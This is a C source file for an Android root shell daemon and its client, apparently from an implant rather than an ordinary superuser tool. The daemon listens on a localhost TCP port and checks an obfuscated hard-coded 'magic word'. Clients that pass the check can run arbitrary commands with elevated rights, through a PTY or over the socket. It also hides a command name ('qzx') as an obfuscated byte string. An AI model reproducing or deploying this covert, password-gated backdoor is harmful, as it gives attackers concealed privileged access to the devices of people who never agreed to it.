#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/time.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <stdint.h>
#include <pwd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <sys/types.h>
#include <pthread.h>
#include <sched.h>
#include <termios.h>
#include <signal.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "su.h"
#include "utils.h"
#include "pts.h"
#include "suidext.h"
#include "log.h"
#include "shell_params.h"
#include "deobfuscate.h"

#define ATTY_IN     1
#define ATTY_OUT    2
#define ATTY_ERR    4

// "0c7e88b2c6bb81acf089d8f5b73489d1ecedc6b9" : sha1 of "l337Wh0R3@d"
#define MAGIC_WORD "\xf0\xc8\x10\x40\x93\x47\x95\x58\x58\x92\x42\x93\x46\x92\x92\x58\x41\x91\x93\x96\x40\x58\x59\x94\x58\x96\x45\x92\x47\x43\x44\x58\x59\x94\x41\x95\x93\x95\x94\x93\x46\x92\x59"

int is_daemon = 0;
int daemon_from_uid = 0;
int daemon_from_pid = 0;


static int read_int(int fd) {
  int val;
  int len = read(fd, &val, sizeof(int));
  if (len != sizeof(int)) {
    LOGE("unable to read int: %d", len);
    exit(-1);
  }
  return val;
}

static void write_int(int fd, int val) {
  int written = write(fd, &val, sizeof(int));
  if (written != sizeof(int)) {
    PLOGE("unable to write int");
    exit(-1);
  }
}

static char* read_string(int fd) {
  int len = read_int(fd);
  if (len > PATH_MAX || len < 0) {
    LOGE("invalid string length %d", len);
    exit(-1);
  }
  char* val = malloc(sizeof(char) * (len + 1));
  if (val == NULL) {
    LOGE("unable to malloc string");
    exit(-1);
  }
  val[len] = '\0';
  int amount = read(fd, val, len);
  if (amount != len) {
    LOGE("unable to read string");
    exit(-1);
  }
  return val;
}

static void write_string(int fd, char* val) {
  int len = strlen(val);
  write_int(fd, len);
  int written = write(fd, val, len);
  if (written != len) {
    PLOGE("unable to write string");
    exit(-1);
  }
}

#ifdef SUPERUSER_EMBEDDED
static void mount_emulated_storage(int user_id) {
  const char *emulated_source = getenv("EMULATED_STORAGE_SOURCE");
  const char *emulated_target = getenv("EMULATED_STORAGE_TARGET");
  const char* legacy = getenv("EXTERNAL_STORAGE");
  
  if (!emulated_source || !emulated_target) {
    // No emulated storage is present
    return;
  }
  
  // Create a second private mount namespace for our process
  if (unshare(CLONE_NEWNS) < 0) {
    PLOGE("unshare");
    return;
  }
  
  if (mount("rootfs", "/", NULL, MS_SLAVE | MS_REC, NULL) < 0) {
    PLOGE("mount rootfs as slave");
    return;
  }
  
  // /mnt/shell/emulated -> /storage/emulated
  if (mount(emulated_source, emulated_target, NULL, MS_BIND, NULL) < 0) {
    PLOGE("mount emulated storage");
  }
  
  char target_user[PATH_MAX];
  snprintf(target_user, PATH_MAX, "%s/%d", emulated_target, user_id);
  
  // /mnt/shell/emulated/<user> -> /storage/emulated/legacy
  if (mount(target_user, legacy, NULL, MS_BIND | MS_REC, NULL) < 0) {
    PLOGE("mount legacy path");
  }
}
#endif

static int run_daemon_child(int infd, int outfd, int errfd, int argc, char** argv, int use_socket) {
  int ret = 0;

  LOGD("in out err %d %d %d", infd, outfd, errfd);

  if (-1 == dup2(outfd, STDOUT_FILENO)) {
    PLOGE("dup2 child outfd");
    LOGE("out: %d\n", outfd);
    exit(-1);
  }
  
  if (-1 == dup2(errfd, STDERR_FILENO)) {
    PLOGE("dup2 child errfd");
    exit(-1);
  }

  if (-1 == dup2(infd, STDIN_FILENO)) {
    PLOGE("dup2 child infd");
    exit(-1);
  }
  
  if(!use_socket) {
    close(infd);
    close(outfd);
    close(errfd);
  }

  return exec_cmd(argc, argv);

}

static int daemon_accept(int fd) {
  int ret = 0;
  int use_socket_for_out = 0;
  int infd, outfd, errfd;
  char *magic_word;

  // Magic word?
  magic_word = read_string(fd);
  if(strcmp(deobfuscate(MAGIC_WORD), magic_word))
    exit(-1);

  LOGD("Magic word accepted");

  is_daemon = 1;
  int pid = read_int(fd);
  LOGD("remote pid: %d", pid);
  char *pts_slave = read_string(fd);
  LOGD("remote pts_slave: %s", pts_slave);
  daemon_from_uid = read_int(fd);
  LOGV("remote uid: %d", daemon_from_uid);
  daemon_from_pid = read_int(fd);
  LOGV("remote req pid: %d", daemon_from_pid);
  
  int mount_storage = read_int(fd);

  int argc = read_int(fd);
  if (argc < 0 || argc > 512) {
    LOGE("unable to allocate args: %d", argc);
    exit(-1);
  }
  LOGV("remote args: %d", argc);
  char** argv = (char**)malloc(sizeof(char*) * (argc + 1));
  argv[argc] = NULL;
  int i;
  for (i = 0; i < argc; i++) {
    argv[i] = read_string(fd);
  }
  
  // ack
  write_int(fd, 1);

  // Become session leader
  if (setsid() == (pid_t) -1) {
    PLOGE("setsid");
  }
  
  int ptsfd;
  if (pts_slave[0]) {
    // Opening the TTY has to occur after
    // the setsid() so that it becomes
    // our controlling TTY and not the daemon's
    close (fd);
    ptsfd = open(pts_slave, O_RDWR);
    if (ptsfd == -1) {
      PLOGE("open(pts_slave) daemon");
      exit(-1);
    }
  
    LOGD("daemon: stdin using PTY");
    infd  = ptsfd;  
      
    LOGD("daemon: stdout using PTY");
    outfd = ptsfd;

    LOGD("daemon: stderr using PTY");
    errfd = ptsfd;
  
  } else {
    // If we dont have a pty, use the socket
    use_socket_for_out = 1;
    infd = fd;
    outfd = fd;
    errfd = fd;
    LOGD("Using socket for output");

  }
  free(pts_slave);
  
  ret = run_daemon_child(infd, outfd, errfd, argc, argv, use_socket_for_out);

  // If we are communicating via socket and not via pty send the return value
  if(use_socket_for_out)
    write_int(fd, ret);

  return ret;
}


// Run the daemon process
int run_daemon() {
  int fd;
  struct sockaddr_in sun;
  
  fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd < 0) {
    PLOGE("socket");
    return -1;
  }
  if (fcntl(fd, F_SETFD, FD_CLOEXEC)) {
    PLOGE("fcntl FD_CLOEXEC");
    goto err;
  }

  // Open a socket on localhost
  memset(&sun, 0, sizeof(sun));
  sun.sin_family = AF_INET;
  sun.sin_port = htons(SHELL_PORT);
  sun.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  
  if (bind(fd, (struct sockaddr*)&sun, sizeof(sun)) < 0) {
    PLOGE("daemon bind");
    goto err;
  }
  
  if (listen(fd, 10) < 0) {
    PLOGE("daemon listen");
    goto err;
  }
  
  // Accept loop
  // For each incoming connection spawn a new process with init context
  int client;
  while ((client = accept(fd, NULL, NULL)) > 0) {
    
    if (fork_zero_fucks() == 0) {
      close(fd);
      return daemon_accept(client);
    }
    else {
      close(client);
    }
  }
  
  LOGE("daemon exiting");
 err:
  close(fd);
  return -1;
}

// List of signals which cause process termination
static int quit_signals[] = { SIGALRM, SIGHUP, SIGPIPE, SIGQUIT, SIGTERM, SIGINT, 0 };

static void sighandler(int sig) {
  restore_stdin();
  
  // Assume we'll only be called before death
  // See note before sigaction() in set_stdin_raw()
  //
  // Now, close all standard I/O to cause the pumps
  // to exit so we can continue and retrieve the exit
  // code
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
  
  // Put back all the default handlers
  struct sigaction act;
  int i;
  
  memset(&act, '\0', sizeof(act));
  act.sa_handler = SIG_DFL;
  for (i = 0; quit_signals[i]; i++) {
    if (sigaction(quit_signals[i], &act, NULL) < 0) {
      PLOGE("Error removing signal handler");
      continue;
    }
  }
}

/*
 * Setup signal handlers trap signals which should result in program termination
 * so that we can restore the terminal to its normal state and retrieve the 
 * return code.
 */
static void setup_sighandlers(void) {
  struct sigaction act;
  int i;
  
  // Install the termination handlers
  // Note: we're assuming that none of these signal handlers are already trapped.
  // If they are, we'll need to modify this code to save the previous handler and
  // call it after we restore stdin to its previous state.
  memset(&act, '\0', sizeof(act));
  act.sa_handler = &sighandler;
  for (i = 0; quit_signals[i]; i++) {
    if (sigaction(quit_signals[i], &act, NULL) < 0) {
      PLOGE("Error installing signal handler");
      continue;
    }
  }
}

int connect_daemon(int argc, char *argv[]) {
  unsigned char qzx[] = "\x04\x52\x55\x95\x82\x9c"; // "qzx"
  int uid = getuid();
  int ptmx;
  char pts_slave[PATH_MAX];
  int has_output = 0;
  int is_returning = 0;
  char recvBuff[256];
  int ret = 0;
  struct sockaddr_in sun;

  // Check which command we are executing
  // If we are executing a shell command, we need to read the output and not wait for ret
  if(strcmp(argv[1], deobfuscate(qzx)) == 0) {
    has_output = 1;
    is_returning = 0;
  }
  else is_returning = 1;
  
  // Open a socket to the daemon
  int socketfd = socket(AF_INET, SOCK_STREAM, 0);
  if (socketfd < 0) {
    PLOGE("socket");
    exit(-1);
  }
  if (fcntl(socketfd, F_SETFD, FD_CLOEXEC)) {
    PLOGE("fcntl FD_CLOEXEC");
    exit(-1);
  }
  
  memset(&sun, 0, sizeof(sun));
  
  sun.sin_family = AF_INET;
  sun.sin_port = htons(SHELL_PORT);
  
  if (0 != connect(socketfd, (struct sockaddr*)&sun, sizeof(sun))) {
    PLOGE("connect");
    exit(-1);
  }
  
  LOGV("connecting client %d", getpid());
  
  int mount_storage = getenv("MOUNT_EMULATED_STORAGE") != NULL;
  
  // Determine which one of our streams are attached to a TTY
  int atty = 0;
  
  // TODO: Check a system property and never use PTYs if
  // the property is set.
  if (isatty(STDIN_FILENO))  atty |= ATTY_IN;
  if (isatty(STDOUT_FILENO)) atty |= ATTY_OUT;
  if (isatty(STDERR_FILENO)) atty |= ATTY_ERR;
  
  if (atty) {
    // Using PTY
    LOGD("Using pty");

    // We need a PTY. Get one.
    ptmx = pts_open(pts_slave, sizeof(pts_slave));
    if (ptmx < 0) {
      PLOGE("pts_open");
      exit(-1);
    }
  } else {
    pts_slave[0] = '\0';
  }
  
  // Send the magic word to the daemon
  write_string(socketfd, deobfuscate(MAGIC_WORD));

  // Send some info to the daemon, starting with our PID
  write_int(socketfd, getpid());
  // Send the slave path to the daemon
  // (This is "" if we're not using PTYs)
  write_string(socketfd, pts_slave);
  // User ID
  write_int(socketfd, uid);
  // Parent PID
  write_int(socketfd, getppid());
  write_int(socketfd, mount_storage);
  
  // Send stdout
  if (atty & ATTY_OUT) 
    // Forward SIGWINCH
    watch_sigwinch_async(STDOUT_FILENO, ptmx);   
  
  // Number of command line arguments
  write_int(socketfd, mount_storage ? argc - 1 : argc);
  
  // Command line arguments
  int i;
  for (i = 0; i < argc; i++) {
    if (i == 1 && mount_storage) {
      continue;
    }
    write_string(socketfd, argv[i]);
  }
  
  // Wait for acknowledgement from daemon
  read_int(socketfd);
  
  if (atty & ATTY_IN) {
    setup_sighandlers();
    pump_stdin_async(ptmx);
  }
  if (atty & ATTY_OUT) {
    pump_stdout_blocking(ptmx);
  }

  // If we dont have a pty, we need to use the socket to get the output and return value
  if(!atty) {
    // If we expect an output listen for it
    if(has_output) {
      LOGD("Command has output... listening");
      while((i = read(socketfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
	recvBuff[i] = 0;
	if(fputs(recvBuff, stdout) == EOF)
	  LOGE("Error printing output");
      }
    }
    
    // If we expect a return value listen for it
    if(is_returning) {
      ret = read_int(socketfd);
      LOGD("Received %d", ret);
    }
  }
  
  close(socketfd);
   
  return ret;
}
